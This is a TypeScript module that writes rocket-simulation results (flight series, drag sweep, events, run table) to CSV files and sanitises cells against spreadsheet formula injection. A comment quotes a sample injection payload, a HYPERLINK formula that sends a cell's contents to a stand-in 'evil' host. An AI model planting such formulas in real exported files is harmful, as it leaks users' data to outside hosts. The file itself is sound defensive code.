import type { FlightResult, FlightSummary, AeroSweep } from '../../engine/openRocketEngine';
import {
  branchSeries,
  defaultCsvFormat,
  flightColumns,
  usableColumns,
  type FlightColumn,
} from '../flight/flightColumns';
import { forwardFlightEnd, maxQ, maxQAlpha, maxRollRate, type EventRow } from '../flight/flightEvents';
import { withLauncher, type LauncherKind } from '../design/launcher';
import { siToUi, siToUiDelta, type Quantity, type UnitSelection } from '../../prefs/units';
import { plainDecimal } from '../files/numberText';
import { csvField, csvQuoted, neutralizeFormula } from './csvCell';
import { componentName, isDefaultComponentName } from '../app/warningText';

/**
 * CSV exporters for the flight time-series and the drag sweep. Columns are
 * written in the user's chosen units, and every header cell names the unit it
 * carries, so a file stays self-describing whatever the preference was when it
 * was written. Numbers use '.' as the decimal separator regardless of locale.
 *
 * A unit with an offset (air temperature in the flight series) is converted
 * value by value with `siToUi`, since a kelvin reading is not a multiple of its
 * Celsius or Fahrenheit reading. Every other column is scaled by one
 * `siToUiDelta` factor.
 */
const EOL = '\r\n';

const cell = (v: number | null | undefined, digits?: number): string => {
  if (v == null || !Number.isFinite(v)) return '';
  return digits == null ? plainDecimal(v, 6) : v.toFixed(digits);
};
const mul = (v: number | null | undefined, f: number): number | null =>
  v == null || !Number.isFinite(v) ? null : v * f;
const row = (cells: (string | number)[]): string => cells.join(',');

/** Resolves an i18n key, as the caller's `t` does. */
export type CsvTranslate = (key: string, vars?: Record<string, unknown>) => string;

/** A translated column title with the unit its cells carry. */
const titled = (title: string, unit?: string): string => csvField(unit ? `${title} (${unit})` : title);

/** A column's SI→display multiplier and the symbol its header should name. */
const col = (units: UnitSelection, q: Quantity): { f: number; sym: string } => ({
  f: siToUiDelta(q, units[q], 1),
  sym: units[q],
});

/**
 * How a flight CSV is written: which columns, in what format, with which
 * comments: OpenRocket's own Export data options, which it keeps in
 * `CsvOptionPanel` and the export panel beside it.
 *
 * All of it is the user's choice: a fixed twelve columns, comma separated, six
 * significant digits with the event lines always on is one opinion about a file
 * somebody else has to read.
 */
export interface FlightCsvOptions {
  /** Series keys to write, in `flightColumns` order. */
  columns: readonly string[];
  /** Between fields. A tab or a space is as legitimate as a comma. */
  separator: string;
  /** Decimal places for every value. */
  decimals: number;
  /** 1.5e-4 rather than 0.00015, for series that span many magnitudes. */
  exponential: boolean;
  /** A comment naming the simulation and the design it flew. */
  simDescription: boolean;
  /**
   * The column names with their units, as one commented line above the data:
   * the file's only header, as on desktop.
   */
  fieldDescriptions: boolean;
  /** A comment per flight event, placed among the data rows at its time. */
  flightEvents: boolean;
  /** What marks a comment line. */
  commentChar: string;
  /** Which branch of a staged flight to write. */
  branchIndex: number;
  /**
   * The human name for a column.
   *
   * Passed in because the names are translated and this service has no
   * translator: it is plain TypeScript, called from a dialog and from tests
   * alike. A column with no name of its own falls back to its kernel symbol,
   * which is what a symbol-only series has anyway.
   */
  columnName: (c: FlightColumn) => string;
}

const DEFAULT_CSV_OPTIONS: FlightCsvOptions = {
  ...defaultCsvFormat(),
  branchIndex: 0,
  columnName: (c) => c.key,
};

/** One value, formatted per the options. Blank for a gap, so a hole reads as one. */
function value(v: number | null | undefined, o: FlightCsvOptions): string {
  if (v == null || !Number.isFinite(v)) return '';
  return o.exponential ? v.toExponential(o.decimals) : v.toFixed(o.decimals);
}

/**
 * Per-timestep flight data, in the user's units, with the columns and format the
 * caller asked for.
 *
 * The layout follows OpenRocket's CSV export: the simulation comments, a bare
 * comment line, the field names as one commented line, then the data rows with
 * each event comment among them at its time. The comment text differs: desktop
 * writes the simulation name with its status and ` (unit)` after every field
 * name even when the unit is empty; this writes `Simulation:` and `Stage:` lines
 * and no empty brackets. A script that parses the structure reads both.
 *
 * `name` titles the simulation-description comment; it is passed in because this
 * service has no view of the workspace.
 */
export function flightDataCsv(
  r: FlightResult,
  units: UnitSelection,
  opts: Partial<FlightCsvOptions> = {},
  name?: string,
): string {
  const o: FlightCsvOptions = { ...DEFAULT_CSV_OPTIONS, ...opts };
  const cols = usableColumns(flightColumns(r, o.branchIndex), o.columns);
  const series = branchSeries(r, o.branchIndex);
  const branch = r.branches?.length ? r.branches[o.branchIndex] : undefined;
  const sep = o.separator;
  // Text here (column headers and comment lines, which carry the simulation and
  // stage names from a shared .ork) is never quoted, so whatever a spreadsheet
  // might split on is replaced with a space: the chosen separator, and `,` `;`
  // and tab whatever the separator is, because Excel splits a `.csv` on its
  // locale's list separator rather than the file's. CR and LF would end the
  // line. A formula trigger is neutralized where a cell can still begin: the
  // start of the text, which begins a header cell, and with the space
  // separator after every space.
  const clean = (text: string) => {
    const flat = text
      .split(sep)
      .join(' ')
      .replace(/[\r\n,;\t]/g, ' ');
    return sep === ' ' ? flat.split(' ').map(neutralizeFormula).join(' ') : neutralizeFormula(flat);
  };

  const unitOf = (c: (typeof cols)[number]): string => (c.quantity ? units[c.quantity] : (c.unit ?? ''));
  // A column's SI to display conversion. A unit whose zero is not SI zero
  // (°C, °F) goes through `siToUi` per value, because a multiplier drops the
  // offset: 288.15 K is 15 °C, not 288.15. The rest keep one factor.
  const convertOf = (c: (typeof cols)[number]): ((si: number) => number) => {
    const q = c.quantity;
    if (q && siToUi(q, units[q], 0) !== 0) {
      const sym = units[q];
      return (si) => siToUi(q, sym, si);
    }
    const f = q ? siToUiDelta(q, units[q], 1) : (c.scale ?? 1);
    return (si) => si * f;
  };
  const converters = cols.map(convertOf);

  const lines: string[] = [];
  const comment = (text: string) => lines.push(`${o.commentChar} ${text}`);
  const n = series?.['time']?.length ?? 0;

  if (o.simDescription && name) comment(`Simulation: ${clean(name)}`);
  // The kernel's default name for a stage nobody named is a lookup key, not a
  // name; the comment lines are English, so it reads as the stage's number.
  if (o.simDescription && branch?.name)
    comment(`Stage: ${isDefaultComponentName(branch.name.trim()) ? `Stage ${o.branchIndex + 1}` : clean(branch.name)}`);
  if (o.simDescription) comment(`${n} data points written for ${cols.length} variables.`);
  // The field names are the one header the file has, and only on request: a
  // commented line, so a reader that skips comments reads data from the top.
  if (o.simDescription && o.fieldDescriptions) lines.push(o.commentChar);
  if (o.fieldDescriptions) {
    comment(
      cols
        .map((c) => {
          const u = unitOf(c);
          return clean(o.columnName(c)) + (u ? ` (${u})` : '');
        })
        .join(sep),
    );
  }

  // Events in time order, each written just before the first sample at or after
  // it, and any past the last sample after the data. Without a time series
  // there is nothing to place them against, so they lead the data.
  const events = o.flightEvents ? [...(branch?.events ?? r.events ?? [])].sort((a, b) => a.time - b.time) : [];
  const time = series?.['time'];
  let next = 0;
  const eventsUpTo = (t: number) => {
    while (next < events.length && events[next]!.time <= t) {
      const e = events[next++]!;
      comment(`Event ${e.type} occurred at t=${plainDecimal(e.time, 3)} seconds`);
    }
  };
  if (!time) eventsUpTo(Infinity);

  for (let i = 0; i < n; i++) {
    const t = time?.[i];
    if (t != null && Number.isFinite(t)) eventsUpTo(t);
    lines.push(
      cols
        .map((c, j) => {
          const raw = (series as Record<string, (number | null)[] | undefined>)[c.key]?.[i];
          return value(raw == null ? null : converters[j]!(raw), o);
        })
        .join(sep),
    );
  }
  eventsUpTo(Infinity);
  return lines.join(EOL) + EOL;
}

/** Cd / CP / CNα vs Mach, with the friction/pressure/base split and per-component Cd. */
export function aeroTableCsv(d: AeroSweep, units: UnitSelection): string {
  const len = col(units, 'length');
  // A component name comes from the design, often a shared .ork. The `Cd_`
  // prefix keeps a trigger from leading the field, but a `,` `;` or tab inside
  // the name opens a new cell in a spreadsheet that splits on it, so the header
  // goes through the shared CSV field rule like every other text cell. Line
  // breaks become spaces, since a header is one line; brackets are dropped.
  const compHeader = (name: string) => `Cd_${name.replace(/[[\]]/g, '').replace(/[\r\n]+/g, ' ')}`;
  const header = ['Mach', 'Cd', 'Cd_friction', 'Cd_pressure', 'Cd_base'];
  if (d.hasNozzle) header.push('Cd_powerOn');
  header.push(`CP (${len.sym})`, 'CNalpha (/rad)');
  // Components are identified by a stable key, not by name, so two unnamed body
  // tubes arrive as two distinct columns rather than one merged one. Number the
  // repeats so the header still says which column is which.
  const seen = new Map<string, number>();
  for (const c of d.components) {
    const base = compHeader(c.name);
    const n = (seen.get(base) ?? 0) + 1;
    seen.set(base, n);
    header.push(n > 1 ? `${base} (${n})` : base);
  }

  const lines = [row(header.map((h) => csvField(h)))];
  for (let i = 0; i < d.machs.length; i++) {
    const cells: string[] = [
      cell(d.machs[i], 3),
      cell(d.powerOff.total[i]),
      cell(d.powerOff.friction[i]),
      cell(d.powerOff.pressure[i]),
      cell(d.powerOff.base[i]),
    ];
    if (d.hasNozzle) cells.push(cell(d.powerOn.total[i]));
    cells.push(cell(mul(d.cp[i], len.f)));
    cells.push(cell(d.cna[i]));
    for (const c of d.components) cells.push(cell(c.cd[i]));
    lines.push(row(cells));
  }
  return lines.join(EOL) + EOL;
}

/**
 * The flight's events, one row each, with the state of the rocket at that
 * instant: the timeline the Results tab shows, as a file.
 *
 * Every extra gets a column of its own here, where the table on screen puts
 * them on a sub-line: a table has 380px and a file has none, and a spreadsheet
 * wants a rectangle it can sort and chart rather than prose in a cell. Most
 * rows leave most of those columns blank, which is the honest shape: only the
 * rail-departure row has a thrust-to-weight, and a blank cell says so.
 *
 * `t`, `eventName` and `stageName` are passed in for the reason `columnName` is
 * above: the headers and the cells are translated, and this service has no
 * translator, so a file is in one language throughout. `stageName`
 * also owns the "Stage 2" fallback for a branch the engine did not name, which
 * is the same split `buildTraces` and the table itself make.
 *
 * Separate from {@link flightDataCsv}, which writes the per-timestep series and
 * can already carry the events as comment lines. A comment is for a reader; the
 * question this answers is "give me the events as data".
 */
export function flightEventsCsv(
  rows: readonly EventRow[],
  units: UnitSelection,
  t: CsvTranslate,
  eventName: (row: EventRow) => string,
  stageName: (row: EventRow) => string,
  name?: string,
): string {
  const dist = col(units, 'distance');
  const vel = col(units, 'velocity');
  const ang = col(units, 'angle');
  const pres = col(units, 'pressure');
  // Names come from the design and from a translation, so they can hold a comma
  // or a newline; neither may split the row. Quoting rather than stripping,
  // because unlike a column header these are the user's own words.
  // Quoting alone does not stop spreadsheet formula injection: Excel and Sheets
  // strip the quoting before evaluating, so a recovery device named
  // `=HYPERLINK("http://evil/?"&A1,"Open")` in a shared .ork would execute when
  // the exported events CSV is opened. `csvQuoted` applies the shared rule,
  // which neutralizes a trigger at the start and after an embedded separator.
  const text = (v: string | undefined): string => {
    if (v == null || v === '') return '';
    return csvQuoted(v.replace(/[\r\n]+/g, ' '));
  };

  const lines: string[] = [];
  // The title line is a comment, not a quoted field, so a separator in the
  // simulation name would open a second cell a spreadsheet evaluates. Comma,
  // semicolon and tab all go: a locale that splits on `;` reads this file too.
  if (name) lines.push(`# ${t('csv.head.simulationLine', { name }).replace(/[\r\n,;\t]+/g, ' ')}`);
  lines.push(
    row([
      titled(t('csv.head.time'), 's'),
      titled(t('csv.head.event')),
      titled(t('csv.head.source')),
      titled(t('csv.head.stage')),
      titled(t('csv.head.altitude'), dist.sym),
      titled(t('csv.head.velocity'), vel.sym),
      titled(t('csv.head.stability'), t('stability.caliber')),
      titled(t('csv.head.thrustWeight')),
      titled(t('csv.head.aoa'), ang.sym),
      titled(t('csv.head.mach')),
      titled(t('csv.head.dynamicPressure'), pres.sym),
    ]),
  );
  for (const r of rows) {
    lines.push(
      row([
        cell(r.time, 3),
        text(eventName(r)),
        // A part the user never named arrives under the kernel's default name,
        // an untranslated bundle key, which reads as the part's type.
        text(r.source && componentName(r.source, t)),
        text(stageName(r)),
        cell(mul(r.altitude, dist.f)),
        cell(mul(r.velocity, vel.f)),
        cell(r.stability),
        cell(r.twr),
        cell(mul(r.aoa, ang.f)),
        cell(r.mach),
        cell(mul(r.q, pres.f)),
      ]),
    );
  }
  return lines.join(EOL) + EOL;
}

/** One simulation as the run table writes it. */
export interface RunTableRow {
  name: string;
  /** The configuration's name, or what it flies when it has none. */
  configuration: string;
  /** The motors it flies, e.g. "Estes C6-5". */
  motors: string;
  /** Up to date, Outdated, Not run: the table's own status, translated by the caller. */
  status: string;
  /** The last run, which for an outdated row describes a design since edited. */
  result?: FlightResult | null;
  /** A .ork's summary for a simulation not flown here; the figures it has, no peaks. */
  fileSummary?: FlightSummary;
}

/**
 * The run table: one row per simulation with the figures the simulations table
 * shows and the peaks the summary adds, in the user's units, each header naming
 * its unit. A row that has never flown keeps its name and leaves the figures
 * blank rather than being dropped, so the file lists every simulation.
 *
 * `t` translates the headers, as the caller translates the status cells; the
 * exit column names the launcher the way the design does (`withLauncher`).
 */
export function runTableCsv(
  rows: readonly RunTableRow[],
  units: UnitSelection,
  t: CsvTranslate,
  launcher: LauncherKind | null = null,
): string {
  const lt = withLauncher(t, launcher);
  const dist = col(units, 'distance');
  const vel = col(units, 'velocity');
  const acc = col(units, 'acceleration');
  const pres = col(units, 'pressure');
  // q·α is Pa·rad in SI, written in the pressure unit times the angle unit.
  const ang = col(units, 'angle');
  const roll = col(units, 'rollRate');
  // Every text cell is the user's own words or a translation: quoted, and
  // neutralized by the shared rule, as the events export does.
  const text = (v: string): string => csvQuoted(v.replace(/[\r\n]+/g, ' '));
  const lines = [
    row([
      titled(t('csv.head.simulation')),
      titled(t('csv.head.configuration')),
      titled(t('csv.head.motors')),
      titled(t('csv.head.status')),
      titled(t('csv.head.apogee'), dist.sym),
      titled(t('csv.head.maxVelocity'), vel.sym),
      titled(t('csv.head.maxAcceleration'), acc.sym),
      titled(t('csv.head.maxMach')),
      titled(lt('csv.head.exitVelocity'), vel.sym),
      titled(t('csv.head.timeToApogee'), 's'),
      titled(t('csv.head.flightTime'), 's'),
      titled(t('csv.head.deploymentVelocity'), vel.sym),
      titled(t('csv.head.landingVelocity'), vel.sym),
      titled(t('csv.head.optimumDelay'), 's'),
      titled(t('csv.head.maxQ'), pres.sym),
      titled(t('csv.head.maxQAlpha'), `${pres.sym}·${ang.sym}`),
      titled(t('csv.head.maxRollRate'), roll.sym),
    ]),
  ];
  for (const r of rows) {
    const s = r.result?.summary ?? r.fileSummary;
    const series = r.result?.series;
    const qa = r.result ? maxQAlpha(series, forwardFlightEnd(r.result)) : null;
    lines.push(
      row([
        text(r.name),
        text(r.configuration),
        text(r.motors),
        text(r.status),
        cell(mul(s?.maxAltitude, dist.f)),
        cell(mul(s?.maxVelocity, vel.f)),
        cell(mul(s?.maxAcceleration, acc.f)),
        cell(s?.maxMachNumber),
        cell(mul(s?.launchRodVelocity, vel.f)),
        cell(s?.timeToApogee),
        cell(s?.flightTime),
        cell(mul(s?.deploymentVelocity, vel.f)),
        cell(mul(s?.groundHitVelocity, vel.f)),
        cell(s?.optimumDelay),
        cell(mul(maxQ(series)?.q, pres.f)),
        cell(mul(qa?.value, pres.f * ang.f)),
        cell(mul(maxRollRate(series), roll.f)),
      ]),
    );
  }
  return lines.join(EOL) + EOL;
}

/** The MIME type the CSV exports are served under. */
export const CSV_MIME = 'text/csv;charset=utf-8';
